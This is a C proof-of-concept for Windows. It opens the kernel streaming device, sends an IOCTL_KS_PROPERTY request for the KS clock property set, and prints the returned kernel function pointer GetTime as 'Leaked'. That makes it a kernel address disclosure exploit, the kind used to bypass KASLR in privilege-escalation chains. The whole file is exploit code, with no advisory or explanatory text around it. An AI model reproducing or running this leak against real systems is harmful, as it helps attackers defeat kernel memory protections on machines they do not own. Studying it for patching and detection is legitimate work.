#include<mmdeviceapi.h>
#include<stdio.h>
#include<Functiondiscoverykeys_devpkey.h>
#include <tchar.h>
#include <stdlib.h> 
#include<time.h> 
#include <ctype.h>
const char KSPROSETID_Clock[] = "\xC0\xA4\x12\xDF\x17\xAC\xCF\x11\xA5\xD6\x28\xDB\x04\xC1\x00\x00";
#define IOCTL_KS_PROPERTY              CTL_CODE(FILE_DEVICE_KS, 0x000, METHOD_NEITHER, FILE_ANY_ACCESS)
struct KSPROPERTY {
    GUID  Set;
    ULONG Id;
    ULONG Flags;
};
typedef struct {
    KSPROPERTY Property;
    ULONG      PinId;
    union {
        ULONG Reserved;
        ULONG Flags;
    };
    DWORD arg1;
    DWORD arg2;
    DWORD arg3;
    DWORD arg4;
} KSP_PIN, * PKSP_PIN;
#define KSPROPERTY_TYPE_GET                 0x00000001//0;
typedef struct {
    PVOID        GetTime;
    PVOID        GetPhysicalTime;
    PVOID GetCorrelatedTime;
    PVOID GetCorrelatedPhysicalTime;
} KSCLOCK_FUNCTIONTABLE;
int main()
{

    HANDLE h = CreateFileW(L"\\\\?\\ROOT#SYSTEM#0000#{53172480-4791-11d0-a5d6-28db04c10000}\\{97ebaacc-95bd-11d0-a3ea-00a0c9223196}&{53172480-4791-11D0-A5D6-28DB04C10000}",
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (h != INVALID_HANDLE_VALUE)
    {

        char* instrument;
        SIZE_T inputLength = 0x1000;
        SIZE_T outputLength = 0x1000;
        char* inputBuffer = (char*)VirtualAlloc(NULL, inputLength, MEM_COMMIT, PAGE_READWRITE);
        //printf("Address of input buffer :  0x%p GLE : 0x%x", inputBuffer, GetLastError());
        KSCLOCK_FUNCTIONTABLE* outputBuffer = (KSCLOCK_FUNCTIONTABLE*)VirtualAlloc(NULL, outputLength, MEM_COMMIT, PAGE_READWRITE);
        //printf("Address of output buffer :  0x%p GLE : 0x%x", outputBuffer, GetLastError());

        KSP_PIN pin = { 0 };

        pin.Property.Flags = 0;

        pin.Property.Flags = KSPROPERTY_TYPE_GET;
        pin.Property.Id = 6;


        memcpy(&pin.Property.Set, &KSPROSETID_Clock, 16);

        memcpy(inputBuffer, &pin, sizeof(KSP_PIN));
        DWORD retByte;
        OVERLAPPED overlap = { 0 };
        NTSTATUS status;

        status = DeviceIoControl(h, IOCTL_KS_PROPERTY, inputBuffer, inputLength, outputBuffer, outputLength, &retByte, &overlap);
        if (outputBuffer->GetTime != NULL)
        {
            printf("Leaked : 0x%p \n", (__int64)outputBuffer->GetTime );


        }

        VirtualFree(outputBuffer, 0, MEM_RELEASE);
        CloseHandle(h);
    }
}